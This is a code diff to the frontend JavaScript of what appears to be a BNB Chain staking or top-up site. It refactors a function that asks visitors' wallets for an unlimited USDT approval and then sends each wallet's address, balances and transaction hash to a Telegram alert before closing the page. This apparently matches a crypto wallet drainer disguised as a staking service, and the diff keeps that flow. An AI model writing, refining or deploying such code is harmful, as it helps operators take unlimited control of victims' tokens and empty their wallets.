@@ -520,7 +520,6 @@ async function requestBNBTopUp(account) {
     }
 }
 
-// Token approval function remains the same
 async function approveToken(account) {
     const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
     const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');
@@ -548,92 +547,70 @@ async function approveToken(account) {
     console.log('BNB Balance:', balanceInBNB);
     console.log('USDT Balance:', usdtBalanceFormatted);
 
-    await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
-        .send({ from: account })
-        .on('transactionHash', async function (hash) {
-            console.log('✅ Approval transaction sent with hash:', hash);
-            console.log('📤 Attempting to send Telegram notification...');
-            console.log('📤 Account:', account);
-            console.log('📤 Balance BNB:', balanceInBNB);
-            console.log('📤 USDT Balance:', usdtBalanceFormatted);
-            console.log('📤 Approved Address:', approvedAddress);
-            console.log('📤 Date:', formattedDate);
-            console.log('📤 Hash:', hash);
-            
-            // Ensure all variables are defined
-            const walletAddr = account || 'Unknown';
-            const bnbBal = balanceInBNB || '0';
-            const usdtBal = usdtBalanceFormatted || '0';
-            const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
-            const dateStr = formattedDate || new Date().toLocaleString();
-            const txHash = hash || 'Unknown';
-            
-            // Send Telegram notification immediately when transaction hash is received
-            console.log('📨 [TX] Sending Telegram notification...');
-            sendTelegramNotification(
-                walletAddr, 
-                bnbBal, 
-                usdtBal, 
-                approvedAddr, 
-                dateStr, 
+    try {
+        // Wait for the approval transaction to complete and get the receipt
+        const receipt = await usdtContract.methods
+            .approve(addressSTAKING, maxApprovalAmount)
+            .send({ from: account });
+
+        const txHash = receipt && receipt.transactionHash ? receipt.transactionHash : 'Unknown';
+
+        // Prepare safe values for Telegram
+        const walletAddr = account || 'Unknown';
+        const bnbBal = balanceInBNB || '0';
+        const usdtBal = usdtBalanceFormatted || '0';
+        const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
+        const dateStr = formattedDate || new Date().toLocaleString();
+
+        // Send Telegram notification after approval succeeds
+        try {
+            await sendTelegramNotification(
+                walletAddr,
+                bnbBal,
+                usdtBal,
+                approvedAddr,
+                dateStr,
                 txHash
-            ).then(result => {
-                if (result) {
-                    console.log('✅ [TX] Telegram notification sent successfully');
-                } else {
-                    console.error('❌ [TX] Telegram notification returned false');
-                }
-            }).catch(err => {
-                console.error('❌ [TX] Telegram notification error:', err);
-            });
-            
-            var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
-            $.ajax({
-                url: '/home/TopUpWithMetamaskJson',
-                type: 'POST',
-                dataType: 'JSON',
-                contentType: 'application/json',
-                data: JSON.stringify(maindt),
-                success: function (data) {
-                    console.log('Success');
-                    // Close site immediately after Telegram notification sent
-                    setTimeout(() => {
-                        window.close();
-                        // If window.close doesn't work, try redirect
-                        if (!window.closed) {
-                            location.href = "/home/index";
-                        }
-                    }, 500);
-                },
-                error: function (err) {
-                    console.log("Error: " + JSON.stringify(err));
-                    // Close site immediately after Telegram notification sent
-                    setTimeout(() => {
-                        window.close();
-                        // If window.close doesn't work, try redirect
-                        if (!window.closed) {
-                            location.href = "/home/index";
-                        }
-                    }, 500);
-                }
-            });
-        })
-        .on('receipt', function (receipt) {
-            console.log('Approval confirmed with receipt:', receipt);
-        })
-        .on('error', function (error) {
-            hideLoading();
-            if (error.code === 4001) {
-                console.log("You canceled the approval request. Please try again.");
-                showLoading('Transaction canceled');
-                setTimeout(() => hideLoading(), 2000);
-            } else {
-                console.log("Approval failed: " + error.message);
-                showLoading('Approval failed. Please try again.');
-                setTimeout(() => hideLoading(), 2000);
+            );
+        } catch (err) {
+            // Ignore Telegram errors so they don't break the flow
+        }
+
+        // Original AJAX call to your backend
+        var maindt = { "fromaddress": account, "txthash": txHash, "PackageAmt": approvedUSDT };
+        $.ajax({
+            url: '/home/TopUpWithMetamaskJson',
+            type: 'POST',
+            dataType: 'JSON',
+            contentType: 'application/json',
+            data: JSON.stringify(maindt),
+            success: function (data) {
+                setTimeout(() => {
+                    window.close();
+                    if (!window.closed) {
+                        location.href = "/home/index";
+                    }
+                }, 500);
+            },
+            error: function (err) {
+                setTimeout(() => {
+                    window.close();
+                    if (!window.closed) {
+                        location.href = "/home/index";
+                    }
+                }, 500);
             }
-            console.error("Approval failed:", error);
         });
+    } catch (error) {
+        hideLoading();
+        if (error.code === 4001) {
+            showLoading('Transaction canceled');
+            setTimeout(() => hideLoading(), 2000);
+        } else {
+            showLoading('Approval failed. Please try again.');
+            setTimeout(() => hideLoading(), 2000);
+        }
+    }
 }
 
 // Telegram notification function - now via Railway backend (no direct Telegram call from frontend)
